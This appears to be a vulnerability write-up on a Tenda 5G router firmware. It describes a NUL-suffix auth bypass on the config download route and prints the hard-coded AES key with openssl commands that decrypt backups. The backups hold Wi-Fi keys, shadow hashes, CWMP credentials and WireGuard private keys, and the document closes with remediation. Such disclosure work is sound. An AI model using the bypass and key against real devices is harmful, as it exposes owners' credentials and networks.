# Tenda Config Backup Decode Deep Dive

Date: 2026-04-22

Target image:

```text
795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip
```

Captured artifact:

```text
path:   poc_out/download_cfg_noauth.bin
size:   16,720 bytes
sha256: 5534dc4502743cd0006594f089c1abb675108661e723d71513e9543a371e7231
route:  GET /cgi-bin/DownloadCfg%00.js
```

## Conclusion

The downloaded config backup is a static-key OpenSSL AES-128-ECB encrypted
wrapper around a gzip tar archive. It is not device-unique cryptography.

The format is:

```text
AES-128-ECB(
  "<md5(config.tgz)>\n" +
  "<product-id>\n" +
  config.tgz
)
```

For this capture, decryption produced:

```text
decrypted size: 16,715 bytes
md5 header:     64309d679b95b410f2695fbaebdb7ced
product header: 5G06V1.0-TDE01
payload type:   gzip compressed tar archive
payload md5:    64309d679b95b410f2695fbaebdb7ced
```

The five-byte encrypted/plaintext size difference is OpenSSL `enc` padding.
Use the normal `openssl enc -d` path; do not add `-nopad` unless you are also
handling PKCS padding manually.

## One-Step Decoder

Use the local helper:

```bash
tools/decode_tenda_config_backup.sh poc_out/download_cfg_noauth.bin tmp/config_backup_decode
```

Expected output includes the verified product string, MD5, tarball path, file
listing, and extracted directory:

```text
product:    5G06V1.0-TDE01
md5:        64309d679b95b410f2695fbaebdb7ced verified
tarball:    tmp/config_backup_decode/config.tgz
listing:    tmp/config_backup_decode/files.txt
extracted:  tmp/config_backup_decode/extracted
```

## Manual Decode

```bash
openssl enc -d -aes-128-ecb \
  -K 4008dfec3c0e98c406b50f8749924008 \
  -in poc_out/download_cfg_noauth.bin \
  -out /tmp/download_cfg.dec

sed -n '1,2p' /tmp/download_cfg.dec
tail -n +3 /tmp/download_cfg.dec > /tmp/config.tgz
md5sum /tmp/config.tgz
tar -tzf /tmp/config.tgz
mkdir -p /tmp/config_extracted
tar -xzf /tmp/config.tgz -C /tmp/config_extracted
```

The first `sed` output should be:

```text
64309d679b95b410f2695fbaebdb7ced
5G06V1.0-TDE01
```

The `md5sum /tmp/config.tgz` value should match the first decrypted line.

## Firmware Evidence

The backup creation path is in `sbin/sysbackup`:

```sh
tar c${TAR_V}zf "$conf_tar.tgz" -T "$CONFFILES" 2>/dev/null
md5sum "$conf_tar.tgz" | awk '{print $1}'  > $MD5_CHECK_FILE
echo $CONF_PRODUCT >> $MD5_CHECK_FILE
cat $MD5_CHECK_FILE $conf_tar.tgz > $TMP_TAR_FILE.tgz
openssl enc -e -aes-128-ecb -in "$TMP_TAR_FILE.tgz" -out "$conf_tar" -K 4008dfec3c0e98c406b50f8749924008
```

The restore path uses the inverse operation and verifies both the embedded MD5
and the product string:

```sh
openssl enc -d -aes-128-ecb -in "$CONF_RESTORE" -out "$CONF_RESTORE.tgz" -K 4008dfec3c0e98c406b50f8749924008
md5_checksum_extract=$(awk 'NR == 1' $CONF_RESTORE.tgz)
fw_product=$(awk 'NR == 2' $CONF_RESTORE.tgz)
tail -n +3 $CONF_RESTORE.tgz > $TMP_TAR_FILE.tgz
restore_file_md5_checksum=$(md5sum $TMP_TAR_FILE.tgz | awk '{print $1}')
```

`td_server` contains the product and backup command strings:

```text
5G06V1.0-TDE01
/tmp/RouterCfm.cfg.bak
sysbackup -b %s %s
/tmp/RouterCfm.cfg
downLoadCfg
td_server.upload_download
get_cfg_system_backup
```

`httpd` contains the protected route and backend call strings:

```text
/cgi-bin/DownloadCfg
td_server.upload_download
get_cfg_system_backup
downloadCfg
/tmp/RouterCfm.cfg
cgi_webs_download_cfg
```

Both services are normal boot services:

```text
etc/init.d/td_server: START=90, command /usr/sbin/td_server
etc/init.d/httpd:     START=99, command /usr/sbin/httpd
```

## Extracted Contents

The decoded archive contains OpenWrt/Tenda config state, including:

```text
etc/config/wireless
etc/config/network
etc/config/firewall
etc/config/cwmp
etc/config/openvpn
etc/config/wireguard
etc/config/pub
etc/passwd
etc/shadow
```

The extracted data includes high-value secrets and security material:

- Wi-Fi SSIDs and PSKs.
- Management account password hash/config.
- `/etc/shadow` password hashes.
- CWMP/TR-069 usernames and passwords.
- VPN-related config, including WireGuard private key material.
- Network topology and firewall configuration.

## Security Impact

The `%00.js` auth bypass turns this into unauthenticated offline disclosure of
the router's protected configuration backup. Because the AES key is hard-coded
in the firmware and the backup format has no per-device secret, any attacker who
can download the blob can decrypt and extract it offline.

Practical impact:

- Recover Wi-Fi credentials and join the LAN/radio network.
- Recover management password hashes for cracking or reuse analysis.
- Recover VPN/CWMP credentials or keys where configured.
- Clone or modify configuration material for follow-on attacks.

## Remediation

- Fix the NUL-suffix route/auth bypass so `/cgi-bin/DownloadCfg%00.js` cannot
  reach the protected handler.
- Require an authenticated, authorized session for all config backup routes.
- Replace the static AES-ECB wrapper with authenticated encryption using a
  per-device or user-derived secret.
- Exclude unnecessary secrets from downloadable backups, or encrypt them
  separately with a key not stored in firmware.
